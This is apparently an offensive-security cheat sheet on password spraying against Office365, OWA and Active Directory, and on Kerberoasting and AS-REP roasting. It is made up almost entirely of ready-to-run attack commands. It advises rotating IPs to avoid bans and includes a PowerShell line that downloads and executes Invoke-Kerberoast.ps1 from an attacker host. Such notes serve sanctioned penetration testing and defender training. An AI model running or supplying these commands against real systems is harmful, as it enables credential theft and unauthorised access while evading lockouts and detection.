# Spraying & Roasting

### Azure / Office365

Search for emails, based on tech stack, default usernames, OSINT information etc., then enumerate which ones are valid with [https://github.com/LMGsec/o365creeper](https://github.com/LMGsec/o365creeper) . This does not cause logs to be written or lockouts to be triggered, so it is pretty safe to do. 

Use [https://github.com/dafthack/MSOLSpray](https://github.com/dafthack/MSOLSpray) to Spray vs Office365. To not get banned by microsoft, using [https://github.com/ustayready/fireprox](https://github.com/ustayready/fireprox) as described on the MSOLSpray repo is advised, which will use an AWS API Gateway to rotate the IPs you are accessing from. An incrementing time based lockout occurs after 10 attempts per account, so be careful.

Ideally this will result in at least 1 valid user account.

### Kerbrute

```text
kerbrute passwordspray -d domain.local --dc dcip users.txt <password to spray>
```

### OWA

Using [https://github.com/byt3bl33d3r/SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit):

```text
atomizer.py owa mail.domain.local <password to spray> -emails.txt
```

### Kerberoast

Make sure your time + timezone and the targets time are in sync, kerberos is very time sensitive. You can view the time on windows with `tzdate /g` or on Linux `rdate -n <targetip>`

#### Covenant

```text
Rubeus kerberoast /format:hashcat
```

#### Impacket

```text
GetUserSPNs.py <domain>/<username>:<password> -outputfile <outfile>
```

#### Native

```bash
Add-Type -AssemblyName System.IdentityModel  
setspn.exe -T <domain> -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

#### PowerSploit

```bash
powershell.exe -Command 'IEX (New-Object Net.Webclient).DownloadString("http://<ip>:<port>/Invoke-Kerberoast.ps1");Invoke-Kerberoast -OutputFormat Hashcat
```

#### ASREPRoast

Without credentials for a list of users:

```text
GetNPUsers.py <domain>/ -usersfile users.txt -format hashcat -outputfile <outfile> -dc-ip <>
```

With credentials for all users:

```text
GetNPUsers.py <domain>/<username>:<password> -request -format hashcat -outputfile <outfile>
```

